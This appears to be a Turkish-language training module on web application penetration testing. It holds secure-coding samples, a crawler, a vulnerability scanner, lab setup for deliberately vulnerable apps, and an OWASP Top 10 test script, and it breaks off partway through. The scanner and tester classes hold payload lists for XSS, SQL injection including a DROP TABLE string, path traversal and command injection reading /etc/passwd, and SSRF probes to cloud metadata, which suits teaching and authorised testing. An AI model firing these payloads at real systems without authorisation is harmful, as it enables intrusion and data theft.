# ğŸŒ Web Uygulama Penetrasyon Testi

## ğŸ“– Ä°Ã§indekiler
- [GiriÅŸ](#giriÅŸ)
- [Ã–ÄŸrenme Hedefleri](#Ã¶ÄŸrenme-hedefleri)
- [GerÃ§ek DÃ¼nya UygulamalarÄ±](#gerÃ§ek-dÃ¼nya-uygulamalarÄ±)
- [Teorik Temeller](#teorik-temeller)
- [Teknik Detaylar](#teknik-detaylar)
- [UygulamalÄ± Laboratuvar](#uygulamalÄ±-laboratuvar)
- [Pratik Egzersizler](#pratik-egzersizler)
- [Kod Ã–rnekleri](#kod-Ã¶rnekleri)
- [Ã–nerilen AraÃ§lar](#Ã¶nerilen-araÃ§lar)
- [YapÄ±landÄ±rma En Ä°yi UygulamalarÄ±](#yapÄ±landÄ±rma-en-iyi-uygulamalarÄ±)
- [GerÃ§ek DÃ¼nya Vaka Ã‡alÄ±ÅŸmalarÄ±](#gerÃ§ek-dÃ¼nya-vaka-Ã§alÄ±ÅŸmalarÄ±)
- [DeÄŸerlendirme ve DoÄŸrulama](#deÄŸerlendirme-ve-doÄŸrulama)
- [Ä°leri Konular](#ileri-konular)
- [Kaynaklar ve Referanslar](#kaynaklar-ve-referanslar)

## ğŸ¯ GiriÅŸ

Web uygulama penetrasyon testi, web uygulamalarÄ±ndaki gÃ¼venlik aÃ§Ä±klarÄ±nÄ± sistematik olarak tespit etmek ve deÄŸerlendirmek iÃ§in kullanÄ±lan kritik bir siber gÃ¼venlik disiplinidir. Modern dijital dÃ¼nyada web uygulamalarÄ±, iÅŸletmelerin ve organizasyonlarÄ±n temel altyapÄ±sÄ±nÄ± oluÅŸturduÄŸu iÃ§in, bu uygulamalarÄ±n gÃ¼venliÄŸi hayati Ã¶nem taÅŸÄ±maktadÄ±r.

### ğŸŒŸ Neden Ã–nemli?

- **YaygÄ±n SaldÄ±rÄ± VektÃ¶rÃ¼**: Web uygulamalarÄ± en yaygÄ±n saldÄ±rÄ± hedefleridir
- **Veri Ä°hlali Riski**: Hassas verilerin korunmasÄ± kritiktir
- **Ä°ÅŸ SÃ¼rekliliÄŸi**: GÃ¼venlik aÃ§Ä±klarÄ± iÅŸ operasyonlarÄ±nÄ± durdurabilir
- **Uyumluluk Gereksinimleri**: Yasal ve dÃ¼zenleyici standartlarÄ± karÅŸÄ±lama
- **Marka Ä°tibarÄ±**: GÃ¼venlik ihlalleri marka gÃ¼venilirliÄŸini zedeler

## ğŸ¯ Ã–ÄŸrenme hedefleri

Bu modÃ¼lÃ¼ tamamladÄ±ktan sonra ÅŸunlarÄ± yapabileceksiniz:

### ğŸ“š Teorik Bilgi
- Web uygulama gÃ¼venlik aÃ§Ä±klarÄ±nÄ± kategorize etme
- OWASP Top 10 zafiyetlerini detaylÄ± anlama
- Web uygulama mimarilerini gÃ¼venlik perspektifinden analiz etme
- Penetrasyon testi metodolojilerini uygulama

### ğŸ› ï¸ Pratik Beceriler
- KapsamlÄ± web uygulama gÃ¼venlik deÄŸerlendirmesi yapma
- Otomatik ve manuel test tekniklerini birleÅŸtirme
- GÃ¼venlik aÃ§Ä±klarÄ±nÄ± exploit etme ve impact analizi
- Profesyonel penetrasyon testi raporlarÄ± hazÄ±rlama

### ğŸ”§ Teknik Yetkinlikler
- Burp Suite, OWASP ZAP gibi araÃ§larÄ± etkin kullanma
- Custom payload ve exploit geliÅŸtirme
- Web teknolojilerini derinlemesine anlama
- GÃ¼venlik testlerini otomatikleÅŸtirme

## ğŸŒ GerÃ§ek DÃ¼nya UygulamalarÄ±

### ğŸ’¼ EndÃ¼stri KullanÄ±m AlanlarÄ±

**E-ticaret PlatformlarÄ±**
- Ã–deme sistemi gÃ¼venliÄŸi
- KullanÄ±cÄ± veri korumasÄ±
- Session yÃ¶netimi
- API gÃ¼venliÄŸi

**Finansal Hizmetler**
- Online banking gÃ¼venliÄŸi
- Fraud detection sistemleri
- PCI DSS uyumluluÄŸu
- Multi-factor authentication

**SaÄŸlÄ±k SektÃ¶rÃ¼**
- HIPAA uyumluluÄŸu
- Hasta veri gÃ¼venliÄŸi
- Telemedicine platformlarÄ±
- Medical device interfaces

**Devlet ve Kamu SektÃ¶rÃ¼**
- Citizen services portals
- Digital identity management
- Critical infrastructure protection
- Data sovereignty

## ğŸ“š Teorik Temeller

### ğŸ—ï¸ Web Uygulama Mimarisi GÃ¼venliÄŸi

#### Client-Side Security
```javascript
// GÃ¼venli client-side validation Ã¶rneÄŸi
class SecureValidator {
    static validateInput(input, type) {
        const patterns = {
            email: /^[^\s@]+@[^\s@]+\.[^\s@]+$/,
            phone: /^\+?[1-9]\d{1,14}$/,
            alphanumeric: /^[a-zA-Z0-9]+$/
        };
        
        // Input sanitization
        const sanitized = this.sanitizeInput(input);
        
        // Pattern validation
        if (patterns[type]) {
            return patterns[type].test(sanitized);
        }
        
        return false;
    }
    
    static sanitizeInput(input) {
        return input
            .replace(/[<>"'&]/g, '')
            .trim()
            .substring(0, 255);
    }
    
    static encodeOutput(output) {
        return output
            .replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;')
            .replace(/'/g, '&#x27;');
    }
}
```

#### Server-Side Security
```python
# GÃ¼venli server-side implementation
import hashlib
import secrets
import jwt
from datetime import datetime, timedelta
from flask import Flask, request, jsonify
from werkzeug.security import generate_password_hash, check_password_hash

class SecureWebApp:
    def __init__(self):
        self.app = Flask(__name__)
        self.app.config['SECRET_KEY'] = secrets.token_hex(32)
        self.setup_security_headers()
        self.setup_routes()
    
    def setup_security_headers(self):
        @self.app.after_request
        def add_security_headers(response):
            response.headers['X-Content-Type-Options'] = 'nosniff'
            response.headers['X-Frame-Options'] = 'DENY'
            response.headers['X-XSS-Protection'] = '1; mode=block'
            response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
            response.headers['Content-Security-Policy'] = "default-src 'self'"
            return response
    
    def generate_csrf_token(self):
        return secrets.token_urlsafe(32)
    
    def validate_csrf_token(self, token, session_token):
        return secrets.compare_digest(token, session_token)
    
    def create_jwt_token(self, user_id):
        payload = {
            'user_id': user_id,
            'exp': datetime.utcnow() + timedelta(hours=1),
            'iat': datetime.utcnow()
        }
        return jwt.encode(payload, self.app.config['SECRET_KEY'], algorithm='HS256')
    
    def validate_jwt_token(self, token):
        try:
            payload = jwt.decode(token, self.app.config['SECRET_KEY'], algorithms=['HS256'])
            return payload['user_id']
        except jwt.ExpiredSignatureError:
            return None
        except jwt.InvalidTokenError:
            return None
```

### ğŸ” OWASP Top 10 DetaylÄ± Analiz

#### A01:2021 â€“ Broken Access Control
```python
# GÃ¼venli access control implementation
from functools import wraps
from flask import session, abort

def require_permission(permission):
    def decorator(f):
        @wraps(f)
        def decorated_function(*args, **kwargs):
            if 'user_id' not in session:
                abort(401)  # Unauthorized
            
            user_permissions = get_user_permissions(session['user_id'])
            if permission not in user_permissions:
                abort(403)  # Forbidden
            
            return f(*args, **kwargs)
        return decorated_function
    return decorator

def get_user_permissions(user_id):
    # Database query to get user permissions
    # Implementation depends on your permission model
    pass

# Usage example
@app.route('/admin/users')
@require_permission('admin.users.read')
def list_users():
    return jsonify(get_all_users())
```

#### A02:2021 â€“ Cryptographic Failures
```python
# GÃ¼venli kriptografik implementation
import bcrypt
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import base64
import os

class SecureCrypto:
    @staticmethod
    def hash_password(password):
        salt = bcrypt.gensalt(rounds=12)
        return bcrypt.hashpw(password.encode('utf-8'), salt)
    
    @staticmethod
    def verify_password(password, hashed):
        return bcrypt.checkpw(password.encode('utf-8'), hashed)
    
    @staticmethod
    def generate_encryption_key(password, salt=None):
        if salt is None:
            salt = os.urandom(16)
        
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
        )
        key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
        return key, salt
    
    @staticmethod
    def encrypt_data(data, key):
        f = Fernet(key)
        return f.encrypt(data.encode())
    
    @staticmethod
    def decrypt_data(encrypted_data, key):
        f = Fernet(key)
        return f.decrypt(encrypted_data).decode()
```

#### A03:2021 â€“ Injection
```python
# SQL Injection korunmasÄ±
import sqlite3
from contextlib import contextmanager

class SecureDatabase:
    def __init__(self, db_path):
        self.db_path = db_path
    
    @contextmanager
    def get_connection(self):
        conn = sqlite3.connect(self.db_path)
        try:
            yield conn
        finally:
            conn.close()
    
    def get_user_by_id(self, user_id):
        # GÃ¼venli parameterized query
        with self.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute(
                "SELECT id, username, email FROM users WHERE id = ?",
                (user_id,)
            )
            return cursor.fetchone()
    
    def search_users(self, search_term):
        # GÃ¼venli LIKE query with input validation
        if not search_term or len(search_term) > 50:
            return []
        
        # Input sanitization
        sanitized_term = search_term.replace('%', '\\%').replace('_', '\\_')
        
        with self.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute(
                "SELECT id, username, email FROM users WHERE username LIKE ? ESCAPE '\\'",
                (f"%{sanitized_term}%",)
            )
            return cursor.fetchall()
```

## ğŸ”§ Teknik Detaylar

### ğŸ•·ï¸ Web Crawling ve Reconnaissance

```python
# GeliÅŸmiÅŸ web crawler
import requests
import re
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
import time
import random

class WebAppRecon:
    def __init__(self, target_url, max_depth=3):
        self.target_url = target_url
        self.max_depth = max_depth
        self.visited_urls = set()
        self.found_endpoints = set()
        self.found_parameters = set()
        self.technologies = set()
        self.session = requests.Session()
        self.setup_session()
    
    def setup_session(self):
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        })
    
    def crawl(self, url=None, depth=0):
        if url is None:
            url = self.target_url
        
        if depth > self.max_depth or url in self.visited_urls:
            return
        
        try:
            response = self.session.get(url, timeout=10)
            self.visited_urls.add(url)
            
            # Technology detection
            self.detect_technologies(response)
            
            # Extract endpoints and parameters
            self.extract_endpoints(response.text, url)
            
            # Find links for further crawling
            if depth < self.max_depth:
                links = self.extract_links(response.text, url)
                for link in links:
                    time.sleep(random.uniform(0.5, 2.0))  # Rate limiting
                    self.crawl(link, depth + 1)
        
        except Exception as e:
            print(f"Error crawling {url}: {e}")
    
    def detect_technologies(self, response):
        headers = response.headers
        content = response.text
        
        # Server detection
        if 'Server' in headers:
            self.technologies.add(f"Server: {headers['Server']}")
        
        # Framework detection
        frameworks = {
            'Django': r'csrfmiddlewaretoken',
            'Laravel': r'laravel_session',
            'Express.js': r'X-Powered-By.*Express',
            'ASP.NET': r'__VIEWSTATE',
            'PHP': r'\.php',
            'WordPress': r'wp-content'
        }
        
        for framework, pattern in frameworks.items():
            if re.search(pattern, content, re.IGNORECASE):
                self.technologies.add(framework)
    
    def extract_endpoints(self, content, base_url):
        # Extract forms
        soup = BeautifulSoup(content, 'html.parser')
        forms = soup.find_all('form')
        
        for form in forms:
            action = form.get('action', '')
            if action:
                endpoint = urljoin(base_url, action)
                self.found_endpoints.add(endpoint)
                
                # Extract form parameters
                inputs = form.find_all(['input', 'select', 'textarea'])
                for input_elem in inputs:
                    name = input_elem.get('name')
                    if name:
                        self.found_parameters.add(name)
        
        # Extract JavaScript endpoints
        js_endpoints = re.findall(r'["\']([/\w\-\.]+\.(?:php|asp|aspx|jsp|do|action))["\']', content)
        for endpoint in js_endpoints:
            full_endpoint = urljoin(base_url, endpoint)
            self.found_endpoints.add(full_endpoint)
    
    def extract_links(self, content, base_url):
        soup = BeautifulSoup(content, 'html.parser')
        links = set()
        
        for link in soup.find_all('a', href=True):
            href = link['href']
            full_url = urljoin(base_url, href)
            
            # Only follow links within the same domain
            if urlparse(full_url).netloc == urlparse(self.target_url).netloc:
                links.add(full_url)
        
        return links
    
    def generate_report(self):
        report = {
            'target': self.target_url,
            'visited_urls': len(self.visited_urls),
            'endpoints': list(self.found_endpoints),
            'parameters': list(self.found_parameters),
            'technologies': list(self.technologies)
        }
        return report
```

### ğŸ¯ Vulnerability Scanner

```python
# KapsamlÄ± vulnerability scanner
import requests
import re
from urllib.parse import urljoin
import json

class WebVulnScanner:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.vulnerabilities = []
        self.payloads = self.load_payloads()
    
    def load_payloads(self):
        return {
            'xss': [
                '<script>alert("XSS")</script>',
                '"><script>alert("XSS")</script>',
                "'><script>alert('XSS')</script>",
                'javascript:alert("XSS")',
                '<img src=x onerror=alert("XSS")>'
            ],
            'sqli': [
                "' OR '1'='1",
                "' OR '1'='1' --",
                "' OR '1'='1' /*",
                "'; DROP TABLE users; --",
                "1' UNION SELECT NULL,NULL,NULL--"
            ],
            'lfi': [
                '../../../etc/passwd',
                '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
                '/etc/passwd',
                'C:\\windows\\system32\\drivers\\etc\\hosts'
            ],
            'command_injection': [
                '; ls -la',
                '| whoami',
                '& dir',
                '; cat /etc/passwd',
                '`id`'
            ]
        }
    
    def scan_xss(self, url, parameters):
        for param in parameters:
            for payload in self.payloads['xss']:
                test_data = {param: payload}
                
                try:
                    # GET request
                    response = self.session.get(url, params=test_data)
                    if payload in response.text:
                        self.vulnerabilities.append({
                            'type': 'Reflected XSS',
                            'url': url,
                            'parameter': param,
                            'payload': payload,
                            'method': 'GET',
                            'severity': 'High'
                        })
                    
                    # POST request
                    response = self.session.post(url, data=test_data)
                    if payload in response.text:
                        self.vulnerabilities.append({
                            'type': 'Reflected XSS',
                            'url': url,
                            'parameter': param,
                            'payload': payload,
                            'method': 'POST',
                            'severity': 'High'
                        })
                
                except Exception as e:
                    continue
    
    def scan_sqli(self, url, parameters):
        for param in parameters:
            for payload in self.payloads['sqli']:
                test_data = {param: payload}
                
                try:
                    response = self.session.post(url, data=test_data)
                    
                    # SQL error patterns
                    sql_errors = [
                        r'SQL syntax.*MySQL',
                        r'Warning.*mysql_.*',
                        r'valid MySQL result',
                        r'PostgreSQL.*ERROR',
                        r'Warning.*pg_.*',
                        r'valid PostgreSQL result',
                        r'Microsoft Access Driver',
                        r'Microsoft JET Database',
                        r'Oracle error',
                        r'Oracle.*Driver',
                        r'SQLite.*error'
                    ]
                    
                    for error_pattern in sql_errors:
                        if re.search(error_pattern, response.text, re.IGNORECASE):
                            self.vulnerabilities.append({
                                'type': 'SQL Injection',
                                'url': url,
                                'parameter': param,
                                'payload': payload,
                                'evidence': error_pattern,
                                'severity': 'Critical'
                            })
                            break
                
                except Exception as e:
                    continue
    
    def scan_lfi(self, url, parameters):
        for param in parameters:
            for payload in self.payloads['lfi']:
                test_data = {param: payload}
                
                try:
                    response = self.session.get(url, params=test_data)
                    
                    # LFI indicators
                    lfi_indicators = [
                        r'root:.*:0:0:',
                        r'\[boot loader\]',
                        r'\[operating systems\]'
                    ]
                    
                    for indicator in lfi_indicators:
                        if re.search(indicator, response.text, re.IGNORECASE):
                            self.vulnerabilities.append({
                                'type': 'Local File Inclusion',
                                'url': url,
                                'parameter': param,
                                'payload': payload,
                                'severity': 'High'
                            })
                            break
                
                except Exception as e:
                    continue
    
    def scan_security_headers(self, url):
        try:
            response = self.session.get(url)
            headers = response.headers
            
            security_headers = {
                'X-Frame-Options': 'Missing X-Frame-Options header',
                'X-XSS-Protection': 'Missing X-XSS-Protection header',
                'X-Content-Type-Options': 'Missing X-Content-Type-Options header',
                'Strict-Transport-Security': 'Missing HSTS header',
                'Content-Security-Policy': 'Missing CSP header'
            }
            
            for header, message in security_headers.items():
                if header not in headers:
                    self.vulnerabilities.append({
                        'type': 'Missing Security Header',
                        'url': url,
                        'description': message,
                        'severity': 'Medium'
                    })
        
        except Exception as e:
            pass
    
    def generate_report(self):
        report = {
            'target': self.target_url,
            'scan_date': str(datetime.now()),
            'total_vulnerabilities': len(self.vulnerabilities),
            'vulnerabilities_by_severity': {
                'Critical': len([v for v in self.vulnerabilities if v.get('severity') == 'Critical']),
                'High': len([v for v in self.vulnerabilities if v.get('severity') == 'High']),
                'Medium': len([v for v in self.vulnerabilities if v.get('severity') == 'Medium']),
                'Low': len([v for v in self.vulnerabilities if v.get('severity') == 'Low'])
            },
            'vulnerabilities': self.vulnerabilities
        }
        return report
```

## ğŸ§ª UygulamalÄ± Laboratuvar

### ğŸ—ï¸ Test OrtamÄ± Kurulumu

```bash
#!/bin/bash
# Web Application Pentest Lab Setup

echo "Setting up Web Application Penetration Testing Lab..."

# Update system
sudo apt update && sudo apt upgrade -y

# Install Docker
curl -fsSL https://get.docker.com -o get-docker.sh
sh get-docker.sh
sudo usermod -aG docker $USER

# Install Docker Compose
sudo curl -L "https://github.com/docker/compose/releases/download/v2.20.0/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose
sudo chmod +x /usr/local/bin/docker-compose

# Create lab directory
mkdir -p ~/web-pentest-lab
cd ~/web-pentest-lab

# Download vulnerable applications
git clone https://github.com/WebGoat/WebGoat.git
git clone https://github.com/digininja/DVWA.git
git clone https://github.com/ethicalhack3r/DVWA.git
git clone https://github.com/OWASP/NodeGoat.git

# Create docker-compose for vulnerable apps
cat > docker-compose.yml << 'EOF'
version: '3.8'
services:
  dvwa:
    image: vulnerables/web-dvwa
    ports:
      - "8080:80"
    environment:
      - MYSQL_ROOT_PASSWORD=password
      - MYSQL_DATABASE=dvwa
      - MYSQL_USER=dvwa
      - MYSQL_PASSWORD=password
  
  webgoat:
    image: webgoat/goatandwolf
    ports:
      - "8081:8080"
      - "9090:9090"
  
  mutillidae:
    image: citizenstig/nowasp
    ports:
      - "8082:80"
  
  juice-shop:
    image: bkimminich/juice-shop
    ports:
      - "8083:3000"
  
  nodegoat:
    image: owasp/nodegoat
    ports:
      - "8084:4000"
EOF

# Start vulnerable applications
docker-compose up -d

echo "Lab setup complete!"
echo "Access points:"
echo "DVWA: http://localhost:8080"
echo "WebGoat: http://localhost:8081/WebGoat"
echo "Mutillidae: http://localhost:8082"
echo "OWASP Juice Shop: http://localhost:8083"
echo "NodeGoat: http://localhost:8084"
```

### ğŸ”§ Burp Suite KonfigÃ¼rasyonu

```python
# Burp Suite API automation
import requests
import json
import time

class BurpSuiteAPI:
    def __init__(self, api_url="http://127.0.0.1:1337", api_key=None):
        self.api_url = api_url
        self.api_key = api_key
        self.session = requests.Session()
        if api_key:
            self.session.headers.update({'X-API-Key': api_key})
    
    def start_scan(self, target_url, scan_type="crawl_and_audit"):
        data = {
            "urls": [target_url],
            "scan_type": scan_type
        }
        
        response = self.session.post(
            f"{self.api_url}/burp/scanner/scans/active",
            json=data
        )
        
        if response.status_code == 201:
            return response.json()['task_id']
        else:
            raise Exception(f"Failed to start scan: {response.text}")
    
    def get_scan_status(self, task_id):
        response = self.session.get(
            f"{self.api_url}/burp/scanner/scans/{task_id}"
        )
        return response.json()
    
    def get_scan_issues(self, task_id):
        response = self.session.get(
            f"{self.api_url}/burp/scanner/scans/{task_id}/issues"
        )
        return response.json()
    
    def export_scan_report(self, task_id, report_type="HTML"):
        data = {
            "report_type": report_type,
            "include_false_positives": False
        }
        
        response = self.session.post(
            f"{self.api_url}/burp/scanner/scans/{task_id}/report",
            json=data
        )
        
        return response.content

# Usage example
def automated_burp_scan(target_url):
    burp = BurpSuiteAPI()
    
    print(f"Starting scan for {target_url}")
    task_id = burp.start_scan(target_url)
    
    # Wait for scan completion
    while True:
        status = burp.get_scan_status(task_id)
        if status['scan_status'] == 'finished':
            break
        print(f"Scan progress: {status.get('scan_progress', 0)}%")
        time.sleep(30)
    
    # Get issues
    issues = burp.get_scan_issues(task_id)
    print(f"Found {len(issues)} issues")
    
    # Export report
    report = burp.export_scan_report(task_id)
    with open(f"burp_report_{task_id}.html", "wb") as f:
        f.write(report)
    
    return issues
```

## ğŸ¯ Pratik Egzersizler

### Egzersiz 1: OWASP Top 10 KapsamlÄ± Test

```python
# OWASP Top 10 automated testing framework
import requests
import re
from urllib.parse import urljoin
import json
from datetime import datetime

class OWASPTop10Tester:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.results = {
            'A01_Broken_Access_Control': [],
            'A02_Cryptographic_Failures': [],
            'A03_Injection': [],
            'A04_Insecure_Design': [],
            'A05_Security_Misconfiguration': [],
            'A06_Vulnerable_Components': [],
            'A07_Authentication_Failures': [],
            'A08_Software_Data_Integrity': [],
            'A09_Security_Logging_Monitoring': [],
            'A10_Server_Side_Request_Forgery': []
        }
    
    def test_broken_access_control(self):
        """A01:2021 â€“ Broken Access Control"""
        test_cases = [
            '/admin',
            '/admin/',
            '/administrator',
            '/admin.php',
            '/admin/index.php',
            '/admin/login.php',
            '/admin/admin.php',
            '/admin_area/admin.php',
            '/admin_area/login.php',
            '/siteadmin/login.php',
            '/siteadmin/index.php',
            '/adminpanel/index.php',
            '/admincontrol/login.php',
            '/admin/account.php',
            '/admin/index.html',
            '/admin/login.html',
            '/admin/home.php',
            '/admin_area/index.php',
            '/bb-admin/index.php',
            '/bb-admin/login.php',
            '/bb-admin/admin.php',
            '/admin/controlpanel.php',
            '/admincp/index.asp',
            '/admincp/login.asp',
            '/admincp/index.html',
            '/admin/account.html',
            '/adminpanel/login.php',
            '/admin/admin_login.php',
            '/admin_login.php',
            '/panel-administracion/login.php',
            '/admin/cp.php',
            '/cp.php',
            '/administrator/index.php',
            '/administrator/login.php',
            '/nsw/admin/login.php',
            '/webadmin/login.php',
            '/admin/admin_login.html',
            '/admin_login.html',
            '/admin/adminLogin.php',
            '/adminLogin.php',
            '/admin/admin.html',
            '/admin.html',
            '/admincp/index.php',
            '/admin/admincp.php',
            '/admincp.php',
            '/admin/secure/index.php',
            '/admin/secure/login.php',
            '/admin/secure/admin.php',
            '/admins.php',
            '/admins.html',
            '/administr8.php',
            '/administr8.html',
            '/webadmin/index.php',
            '/webadmin/admin.php',
            '/webadmin/login.html',
            '/admin/admin_login.asp',
            '/admin_login.asp',
            '/admin/secure/index.html',
            '/admin/secure/login.html',
            '/admin/secure/admin.html'
        ]
        
        for path in test_cases:
            try:
                url = urljoin(self.target_url, path)
                response = self.session.get(url, timeout=10)
                
                if response.status_code == 200:
                    # Check for admin panel indicators
                    admin_indicators = [
                        'admin panel', 'administration', 'control panel',
                        'dashboard', 'login', 'username', 'password'
                    ]
                    
                    content_lower = response.text.lower()
                    if any(indicator in content_lower for indicator in admin_indicators):
                        self.results['A01_Broken_Access_Control'].append({
                            'url': url,
                            'status_code': response.status_code,
                            'description': 'Potentially accessible admin panel',
                            'severity': 'High'
                        })
            
            except Exception as e:
                continue
    
    def test_cryptographic_failures(self):
        """A02:2021 â€“ Cryptographic Failures"""
        try:
            response = self.session.get(self.target_url)
            
            # Check for HTTP instead of HTTPS
            if self.target_url.startswith('http://'):
                self.results['A02_Cryptographic_Failures'].append({
                    'url': self.target_url,
                    'description': 'Site uses HTTP instead of HTTPS',
                    'severity': 'High'
                })
            
            # Check for weak SSL/TLS
            if self.target_url.startswith('https://'):
                import ssl
                import socket
                from urllib.parse import urlparse
                
                parsed_url = urlparse(self.target_url)
                hostname = parsed_url.hostname
                port = parsed_url.port or 443
                
                context = ssl.create_default_context()
                with socket.create_connection((hostname, port)) as sock:
                    with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                        cipher = ssock.cipher()
                        if cipher and cipher[1] in ['SSLv2', 'SSLv3', 'TLSv1', 'TLSv1.1']:
                            self.results['A02_Cryptographic_Failures'].append({
                                'url': self.target_url,
                                'description': f'Weak SSL/TLS version: {cipher[1]}',
                                'severity': 'High'
                            })
        
        except Exception as e:
            pass
    
    def test_injection(self):
        """A03:2021 â€“ Injection"""
        # SQL Injection payloads
        sql_payloads = [
            "'",
            "''",
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "'; DROP TABLE users; --",
            "1' UNION SELECT NULL--",
            "1' UNION SELECT NULL,NULL--",
            "1' UNION SELECT NULL,NULL,NULL--"
        ]
        
        # XSS payloads
        xss_payloads = [
            '<script>alert("XSS")</script>',
            '"><script>alert("XSS")</script>',
            "'><script>alert('XSS')</script>",
            'javascript:alert("XSS")',
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            '<iframe src=javascript:alert("XSS")></iframe>'
        ]
        
        # Test common parameters
        test_params = ['id', 'user', 'search', 'q', 'query', 'name', 'email', 'username']
        
        for param in test_params:
            # Test SQL Injection
            for payload in sql_payloads:
                try:
                    response = self.session.get(
                        self.target_url,
                        params={param: payload},
                        timeout=10
                    )
                    
                    # Check for SQL errors
                    sql_errors = [
                        r'SQL syntax.*MySQL',
                        r'Warning.*mysql_.*',
                        r'PostgreSQL.*ERROR',
                        r'Microsoft Access Driver',
                        r'Oracle error'
                    ]
                    
                    for error_pattern in sql_errors:
                        if re.search(error_pattern, response.text, re.IGNORECASE):
                            self.results['A03_Injection'].append({
                                'url': self.target_url,
                                'parameter': param,
                                'payload': payload,
                                'type': 'SQL Injection',
                                'severity': 'Critical'
                            })
                            break
                
                except Exception as e:
                    continue
            
            # Test XSS
            for payload in xss_payloads:
                try:
                    response = self.session.get(
                        self.target_url,
                        params={param: payload},
                        timeout=10
                    )
                    
                    if payload in response.text:
                        self.results['A03_Injection'].append({
                            'url': self.target_url,
                            'parameter': param,
                            'payload': payload,
                            'type': 'Cross-Site Scripting (XSS)',
                            'severity': 'High'
                        })
                
                except Exception as e:
                    continue
    
    def test_security_misconfiguration(self):
        """A05:2021 â€“ Security Misconfiguration"""
        try:
            response = self.session.get(self.target_url)
            headers = response.headers
            
            # Check for missing security headers
            security_headers = {
                'X-Frame-Options': 'Clickjacking protection missing',
                'X-XSS-Protection': 'XSS protection header missing',
                'X-Content-Type-Options': 'MIME type sniffing protection missing',
                'Strict-Transport-Security': 'HSTS header missing',
                'Content-Security-Policy': 'CSP header missing',
                'Referrer-Policy': 'Referrer policy missing'
            }
            
            for header, description in security_headers.items():
                if header not in headers:
                    self.results['A05_Security_Misconfiguration'].append({
                        'url': self.target_url,
                        'description': description,
                        'severity': 'Medium'
                    })
            
            # Check for information disclosure
            if 'Server' in headers:
                server_header = headers['Server']
                if any(tech in server_header.lower() for tech in ['apache', 'nginx', 'iis']):
                    self.results['A05_Security_Misconfiguration'].append({
                        'url': self.target_url,
                        'description': f'Server information disclosed: {server_header}',
                        'severity': 'Low'
                    })
        
        except Exception as e:
            pass
    
    def test_ssrf(self):
        """A10:2021 â€“ Server-Side Request Forgery"""
        ssrf_payloads = [
            'http://localhost',
            'http://127.0.0.1',
            'http://0.0.0.0',
            'http://169.254.169.254',  # AWS metadata
            'file:///etc/passwd',
            'file:///c:/windows/system32/drivers/etc/hosts'
        ]
        
        test_params = ['url', 'link', 'src', 'source', 'target', 'redirect', 'uri']
        
        for param in test_params:
            for payload in ssrf_payloads:
                try:
                    response = self.session.get(
                        self.target_url,
                        params={param: payload},
                        timeout=10
                    )
                    
                    # Check for SSRF indicators
                    ssrf_indicators = [
                        'root:x:0:0:',  # /etc/passwd content
                        'localhost',
                        '127.0.0.1',
                        'ami-id',  # AWS metadata
                        'instance-id'
                    ]
                    
                    for indicator in ssrf_indicators:
                        if indicator in response.text:
                            self.results['A10_Server_Side_Request_Forgery'].append({
                                'url': self.target_url,
                                'parameter': param,
                                'payload': payload,
                                'severity': 'High'
                            })
                            break
                
                except Exception as e:
                    continue
    
    def run_all_tests(self):
        """Run all OWASP Top 10 tests"""
        print("Starting OWASP Top 10 security tests...")
        
        self.test_broken_access_control()
        print("âœ“ A01: Broken Access Control test completed")
        
        self.test_cryptographic_failures()
        print("âœ“ A02: Cryptographic Failures test completed")
        
        self.test_injection()
        print("âœ“ A03: Injection test completed")
        
        self.test_security_misconfiguration()
        print("âœ“ A05: Security Misconfiguration test completed")
        
        self.test_ssrf()
        print("âœ“ A10: Server-Side Request Forgery test completed")
        
        return self.generate_report()
    
    def generate_report(self):
        """Generate comprehensive test report"""
        total_issues = sum(len(issues) for issues in self.results.values())
        
        report = {
            'target': self.target_url,
            'test_date': datetime.now().isoformat(),
            'total_issues': total_issues,
            'results': self.results,
            'summary': {
                category: len(issues) 
                for category, issues in self.results.items()
            }
        }
        
        return report

# Usage example
if __name__ == "__main__":
    target = "http://localhost:8080"  # DVWA
    tester = OWASPTop10Tester(target)
    report = tester.run_all_tests()
    
    # Save report
    with open(f"owasp_top10_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json", 'w') as f:
        json.dump(report, f, indent=2)
    
    print(f"\nTest completed. Found {report['total_issues']} issues.")
    for category, count in report['summary'].items():
        if count > 0:
            print(f"{category}: {count} issues")
```

### Egzersiz 2: API Security Testing

```python
# API Security Testing Framework
import requests
import json
import jwt
from datetime import datetime, timedelta
import base64
import hashlib

class APISecurityTester:
    def __init__(self, api_base_url):
        self.api_base_url = api_base_url.rstrip('/')
        self.session = requests.Session()
        self.vulnerabilities = []
        self.endpoints = []
    
    def discover_endpoints(self):
        """Discover API endpoints"""
        common_paths = [
            '/api/v1',
            '/api/v2',
            '/api',
            '/rest',
            '/graphql',
            '/swagger.json',
            '/openapi.json',
            '/api-docs',
            '/docs'
        ]
        
        for path in common_paths:
            try:
                url = f"{self.api_base_url}{path}"
                response = self.session.get(url)
                
                if response.status_code == 200:
                    self.endpoints.append(url)
                    
                    # Check for API documentation
                    if 'swagger' in response.text.lower() or 'openapi' in response.text.lower():
                        self.parse_api_documentation(response.json())
            
            except Exception as e:
                continue
    
    def parse_api_documentation(self, doc):
